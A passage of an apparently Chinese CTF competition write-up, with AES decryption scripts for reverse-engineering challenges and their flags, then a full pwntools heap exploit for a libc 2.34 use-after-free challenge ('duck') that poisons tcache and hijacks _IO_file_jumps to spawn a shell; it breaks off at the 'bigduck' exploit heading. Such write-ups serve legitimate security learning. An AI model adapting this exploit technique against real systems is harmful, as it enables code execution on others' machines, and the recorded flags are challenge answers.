punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>iv<span class="token operator">=</span><span class="token string">b'0123456789abcdef'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>key<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'60aef077a3624ff7725b77dae4c6e004'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>aes<span class="token operator">=</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span>iv<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>m<span class="token operator">=</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#flag&#123;50c418de67942e713517e900dbd12183&#125;</span></pre></td></tr></table></figure><h3 id="easycry"><a class="anchor" href="#easycry">#</a> easycry</h3>
<p>re 签到题，exeinfo 查壳，64 位无壳 elf 文件，ida64 载入。</p>
<p 061cc4091400c082234a57034ed05cf2=""><code>flag</code> ：flag</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/c61d07c934a61164fc0d92c28ff9d3ad.png" alt="image-20220619204320327" /></p>
<p>findcrypt 插件搜索，发现 AES 的 sbox，并且 main 函数逻辑比较清晰。</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/f8cec6059657af8083a6574724aef7e0.png" alt="image-20220619204531962" /></p>
<p>v5 是 AES 秘钥，ptr 是扩展秘钥，秘钥是 32 位，sub_1DC5 是秘钥扩展，sub_2181 则是分两个 16 字节进行加密，AES ECB 模式，直接解密即可拿到 flag。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES</pre></td></tr><tr><td data-num="2"></td><td><pre>k<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>aes<span class="token operator">=</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>k<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>c<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#flag&#123;061cc4091400c082234a57034ed05cf2&#125;</span></pre></td></tr></table></figure><h2 id="pwn"><a class="anchor" href="#pwn">#</a> PWN</h2>
<h3 id="duck"><a class="anchor" href="#duck">#</a> duck</h3>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/b330caffb4d582c144c2e06d22eb3057.png" alt="image-20220619194732802" /></p>
<p><strong>flag{693edf4763ef4cdd4f152794028b7f5e}</strong></p>
<p>libc 2.34 下的 pwn 题，给的漏洞比较基础就是 <strong>UAF</strong>，同时给了 Edit 功能，我们可以很简单的 getshell。</p>
<p><strong>思路</strong></p>
<ol>
<li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li>
<li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li>
<li>修改掉 stderr 的 flag 为  <code>/bin/sh\0</code></li>
<li>修改掉  <code>_IO_file_jumps</code>  里的函数指针为  <code>system</code>  ，最后改掉 Top Chunk 的 size 进入  <code>_IO_fflush</code>  触发 getshell。</li>
</ol>
<p><strong>Exp</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python2</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: utf-8 -*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>lg <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>data <span class="token punctuation">:</span> p<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">': \033[1;36m 0x%x \033[0m'</span> <span class="token operator">%</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>breakpoint<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    glibc_dir <span class="token operator">=</span> <span class="token string">'~/Exps/Glibc/glibc-2.27/'</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    gdbscript <span class="token operator">=</span> <span class="token string">'directory %smalloc/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="22"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %sstdio-common/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="23"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %sstdlib/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="24"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %slibio/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="25"></td><td><pre>    elf_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'pmap &#123;&#125;| awk \x27&#123; &#123;print \x241&#125; &#125;\x27'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">if</span> elf<span class="token punctuation">.</span>pie <span class="token keyword">else</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'b *&#123;:#x&#125;\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>breakpoint<span class="token punctuation">)</span> <span class="token operator">+</span> elf_base<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>breakpoint<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token keyword">else</span> breakpoint</pre></td></tr><tr><td data-num="27"></td><td><pre>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> elf<span class="token punctuation">.</span>arch<span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-hp'</span><span class="token punctuation">,</span><span class="token string">'62'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment"># p = process('./pwn')</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment"># debug()</span></pre></td></tr><tr><td data-num="34"></td><td><pre>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.166.147'</span><span class="token punctuation">,</span><span class="token number">58013</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Idx: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>data<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    sea<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>heap_leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>heap_base <span class="token operator">=</span> heap_leak <span class="token operator">&lt;&lt;</span><span class="token number">12</span></pre></td></tr><tr><td data-num="62"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'heap_leak'</span><span class="token punctuation">,</span>heap_leak<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    add<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 9</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre>show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre>libc_leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre>libc_base <span class="token operator">=</span> libc_leak <span class="token operator">-</span> <span class="token number">0x1f2cc0</span></pre></td></tr><tr><td data-num="73"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'libc_leak'</span><span class="token punctuation">,</span>libc_leak<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token comment">#libc = ELF('./libc.so.6')</span></pre></td></tr><tr><td data-num="76"></td><td><pre>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc</pre></td></tr><tr><td data-num="77"></td><td><pre>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base</pre></td></tr><tr><td data-num="78"></td><td><pre>system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system</pre></td></tr><tr><td data-num="79"></td><td><pre>bin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>stderr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1f3680</span></pre></td></tr><tr><td data-num="82"></td><td><pre>helper <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1f45c0</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_leak<span class="token operator">^</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="85"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 11</span></pre></td></tr><tr><td data-num="86"></td><td><pre><span class="token comment"># pause()</span></pre></td></tr><tr><td data-num="87"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 12</span></pre></td></tr><tr><td data-num="88"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>stderr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="89"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'ADDR'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 13</span></pre></td></tr><tr><td data-num="91"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\0'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>helper<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="94"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="96"></td><td><pre>    edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0xd30</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="97"></td><td><pre>    add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="99"></td><td><pre></pre></td></tr><tr><td data-num="100"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="101"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="102"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="103"></td><td><pre></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token comment"># add()</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="bigduck"><a class="anchor" href="#bigduck">#</a> bigduck</h3>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444987/Typera/2023/04/fd8d10ea967cd9e8e58b8c6e824fdcd2.png" alt="image-20220619194814107" /></p>
<p><strong>flag{afae47ead2452a4b5ba629ec88635a51}</strong></p>
<p>libc 2.33 下开了沙盒的堆题，其他部分和上题一样。</p>
<p><strong>思路</strong></p>
<ol>
<li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li>
<li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li>
<li>House of kiwi 完成栈迁移，执行 shellcode 读取 flag</li>
</ol>
<p><strong>exp</strong></p>
